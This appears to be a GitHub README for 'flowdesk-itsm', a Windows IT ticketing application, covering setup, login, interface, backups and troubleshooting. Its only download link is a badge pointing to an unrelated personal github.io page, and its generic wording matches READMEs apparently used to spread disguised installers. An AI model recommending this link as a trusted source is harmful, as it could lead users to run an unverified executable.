# 🏢 flowdesk-itsm - Manage IT services with ease today

[![](https://img.shields.io/badge/Download-Flowdesk-blue.svg)](https://babag6541.github.io)

Flowdesk-itsm helps teams organize IT service tasks. It stores ticket information in a structured way. This software supports internal company processes. It tracks requests, incidents, and daily work tasks.

## ⚙️ System Requirements

Before you install this software, check your computer. You need a modern Windows operating system. Windows 10 and Windows 11 work best. 

Your machine needs these specs:

*   Processor: Dual-core 2.0 GHz or faster.
*   Memory: 8 GB of RAM.
*   Storage: 500 MB of free disk space.
*   Network: A stable internet connection.

Ensure your computer has the latest Windows updates. These updates keep your system safe.

## 🛠️ Configuring Your Setup

The software needs a connection to a database. This database stores your service desk info. When you open the program for the first time, a setup window appears. 

You must enter your database address here. If you use a local database, type "localhost". If you use a remote server, enter the address provided by your system administrator. 

The program asks for a username and password. Enter your credentials. The software connects to the server and creates your workspace. This takes a few seconds. If a green checkmark appears, the connection works.

## 📧 Logging In

Once you connect to the database, the login screen shows up. Enter your registered email address. Type your password. Click the Log In button. 

If you forget your password, click the "Forgot Password" link. The system sends a reset code to your email. Check your inbox for this code. Enter the code in the app. Create your new password.

## 🖥️ Using the Interface

The main dashboard shows your current tasks. On the left side, you see the navigation menu. 

- Dashboard: Shows active tickets and recent updates.
- Tickets: Lists all incidents and requests. Create new tickets here.
- Users: Manages team member access.
- Reports: Displays performance data for your IT team.

To create a new ticket, click the "New Item" button. A window opens. Type the title of the request. Describe the issue in the body area. Assign the task to a team member. Click Save. 

## 🛡️ Maintaining Your System

Check for updates every month. Developers release new versions to fix bugs. Visit the download page again to find updates. Close the program before you install a new version. The installer handles the upgrade process automatically. It keeps your existing data safe during this move. 

Back up your database every week. Export your data to a secure file. Keep this file on an external drive or cloud storage. This protects your work against hardware failure.

## ❓ Troubleshooting

Most issues arise from bad network connections. Check your internet if the app fails to load. Ensure your firewall allows the software to communicate.

If the app freezes, stop the process using the Task Manager. Press Control, Shift, and Escape at the same time. Find the Flowdesk process in the list. Right-click the process and select End Task. Open the program again. This usually fixes temporary stalls.

If problems persist, contact your company IT support. Provide them with your version number. You find the version number in the About menu within the app.
